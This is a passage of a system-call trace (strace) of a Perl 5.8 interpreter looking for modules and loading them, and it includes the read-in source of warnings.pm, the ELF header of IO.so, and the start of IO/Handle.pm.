8458  07:23:31.472522 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472536 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472549 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472567 stat64("/usr/lib/perl5/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472580 stat64("/usr/lib/perl5/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472593 stat64("/usr/share/perl5/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472605 stat64("/usr/share/perl5/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472618 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472631 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472645 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472657 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
8458  07:23:31.472678 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.472693 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.472705 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.472723 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
8458  07:23:31.473156 brk(0x81b6000)    = 0x81b6000
8458  07:23:31.473173 brk(0x81b5000)    = 0x81b5000
8458  07:23:31.473255 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
8458  07:23:31.473686 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
8458  07:23:31.474500 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
8458  07:23:31.474638 read(8, "", 4096) = 0
8458  07:23:31.474651 close(8)          = 0
8458  07:23:31.474806 _llseek(6, 412, [412], SEEK_SET) = 0
8458  07:23:31.474822 _llseek(6, 0, [412], SEEK_CUR) = 0
8458  07:23:31.474832 close(6)          = 0
8458  07:23:31.474875 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8458  07:23:31.474898 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8458  07:23:31.474926 futex(0xb7f05070, 0x81 /* FUTEX_??? */, 2147483647) = 0
8458  07:23:31.474970 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
8458  07:23:31.475014 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8458  07:23:31.475121 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8458  07:23:31.475148 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f09000
8458  07:23:31.475161 mmap2(0xb7f0d000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f0d000
8458  07:23:31.475175 close(6)          = 0
8458  07:23:31.475303 stat64("/etc/perl/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475320 stat64("/etc/perl/IO/Handle.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475334 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475346 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475361 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475374 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475388 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475400 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475413 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475425 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475450 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.475494 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
8458  07:23:31.475531 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.475546 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.475562 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.475580 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define 